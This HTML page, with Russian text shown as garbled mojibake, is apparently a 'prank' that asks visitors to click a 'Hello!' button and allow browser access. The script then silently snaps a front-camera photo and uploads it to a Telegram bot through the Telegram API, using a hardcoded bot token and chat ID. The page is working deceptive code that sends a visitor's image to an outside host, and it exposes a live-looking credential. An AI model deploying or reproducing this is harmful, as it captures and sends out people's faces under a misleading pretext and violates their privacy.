<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Capture</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: Arial, sans-serif;
        }
        
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 600px;
            width: 100%;
        }
        
        h1 {
            color: #333;
            margin-bottom: 30px;
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 24px;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            margin: 20px 0;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        
        button:hover:not(:disabled) {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.6);
        }
        
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        #video {
            width: 100%;
            max-width: 500px;
            border-radius: 10px;
            display: none;
            margin: 20px auto;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        
        #canvas {
            display: none;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
            font-weight: bold;
            animation: fadeIn 0.3s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .loading {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeeba;
        }
        
        .emoji {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .instructions {
            color: #666;
            font-size: 14px;
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="emoji">üì∏</div>
        <h1>–ü—Ä–∏–∫–æ–ª</h1>
        
        <button id="greetBtn">
            <span style="font-size: 24px;">üëã</span> –ü—Ä–∏–≤–µ—Ç!
        </button>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        
        <div id="status" class="status"></div>
        
        <div class="instructions">
            ‚ö° –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É "–ü—Ä–∏–≤–µ—Ç!"<br>
            üì± –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫–æ–≥–¥–∞ –±—Ä–∞—É–∑–µ—Ä –ø–æ–ø—Ä–æ—Å–∏—Ç
        </div>
    </div>

    <script>
        // –í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –¥–ª—è Telegram –±–æ—Ç–∞
        const TELEGRAM_BOT_TOKEN = '8543245906:AAHoJvtSH0eUoVF604baDdXmJnaUBHsP_1M';
        const TELEGRAM_CHAT_ID = '552793585';
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const greetBtn = document.getElementById('greetBtn');
        const statusDiv = document.getElementById('status');
        
        let stream = null;
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ —Å—Ç–∞—Ç—É—Å–∞
        function showStatus(message, type = 'success') {
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            statusDiv.style.display = 'block';
            
            // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Å–∫—Ä—ã–≤–∞–µ–º —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 5000);
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram
        async function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', photoBlob, `photo_${Date.now()}.jpg`);
            formData.append('caption', 'üì∏ –ù–æ–≤–æ–µ —Ñ–æ—Ç–æ —Å —Å–∞–π—Ç–∞!');
            
            try {
                showStatus('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ...', 'loading');
                
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    showStatus('‚úÖ –§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram!');
                } else {
                    showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ: ' + (data.description || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞'), 'error');
                    console.error('Telegram API error:', data);
                }
            } catch (error) {
                showStatus('‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º', 'error');
                console.error('Error:', error);
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —Ñ–æ—Ç–æ
        function capturePhoto() {
            if (!stream) {
                showStatus('‚ùå –ö–∞–º–µ—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞', 'error');
                return;
            }
            
            try {
                // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º canvas –ø–æ–¥ —Ä–∞–∑–º–µ—Ä –≤–∏–¥–µ–æ
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                // –†–∏—Å—É–µ–º –∫–∞–¥—Ä –∏–∑ –≤–∏–¥–µ–æ –Ω–∞ canvas
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º canvas –≤ blob
                canvas.toBlob((blob) => {
                    if (blob) {
                        sendPhotoToTelegram(blob);
                    } else {
                        showStatus('‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Ñ–æ—Ç–æ', 'error');
                    }
                }, 'image/jpeg', 0.9);
                
                // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                stopCamera();
                
            } catch (error) {
                showStatus('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Ñ–æ—Ç–æ', 'error');
                console.error('Capture error:', error);
                stopCamera();
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –∫–∞–º–µ—Ä—ã
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => {
                    track.stop();
                });
                stream = null;
                video.style.display = 'none';
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –∑–∞–ø—É—Å–∫–∞ –∫–∞–º–µ—Ä—ã
        async function startCamera() {
            try {
                showStatus('üì∑ –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ...', 'loading');
                
                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä–µ
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                video.style.display = 'block';
                
                // –ñ–¥–µ–º –∑–∞–≥—Ä—É–∑–∫–∏ –≤–∏–¥–µ–æ –∏ –¥–µ–ª–∞–µ–º —Ñ–æ—Ç–æ
                video.onloadedmetadata = () => {
                    video.play();
                    // –î–∞–µ–º –≤–∏–¥–µ–æ –Ω–µ–º–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
                    setTimeout(() => {
                        capturePhoto();
                    }, 500);
                };
                
            } catch (error) {
                console.error('Camera error:', error);
                
                if (error.name === 'NotAllowedError') {
                    showStatus('‚ùå –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∑–∞–ø—Ä–µ—â–µ–Ω. –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞.', 'error');
                } else if (error.name === 'NotFoundError') {
                    showStatus('‚ùå –ö–∞–º–µ—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞', 'error');
                } else {
                    showStatus('‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ', 'error');
                }
                
                // –í–æ–∑–≤—Ä–∞—â–∞–µ–º –∫–Ω–æ–ø–∫—É –≤ –∏—Å—Ö–æ–¥–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ
                greetBtn.disabled = false;
                greetBtn.textContent = 'üëã –ü—Ä–∏–≤–µ—Ç!';
            }
        }
        
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞ –ø–æ –∫–Ω–æ–ø–∫–µ
        greetBtn.addEventListener('click', () => {
            greetBtn.disabled = true;
            greetBtn.innerHTML = '‚è≥ –§–æ—Ç–æ–≥—Ä–∞—Ñ–∏—Ä—É–µ–º...';
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º –∫–∞–º–µ—Ä—É –∏ –¥–µ–ª–∞–µ–º —Ñ–æ—Ç–æ
            startCamera();
            
            // –°—Ç—Ä–∞—Ö–æ–≤–∫–∞: –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –∫–Ω–æ–ø–∫—É —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥ –µ—Å–ª–∏ —á—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫
            setTimeout(() => {
                if (greetBtn.disabled) {
                    greetBtn.disabled = false;
                    greetBtn.innerHTML = 'üëã –ü—Ä–∏–≤–µ—Ç!';
                    stopCamera();
                    if (statusDiv.style.display === 'none') {
                        showStatus('‚è∞ –í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞', 'error');
                    }
                }
            }, 10000);
        });
        
        // –û—á–∏—â–∞–µ–º —Ä–µ—Å—É—Ä—Å—ã –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', () => {
            stopCamera();
        });
    </script>
</body>
</html>
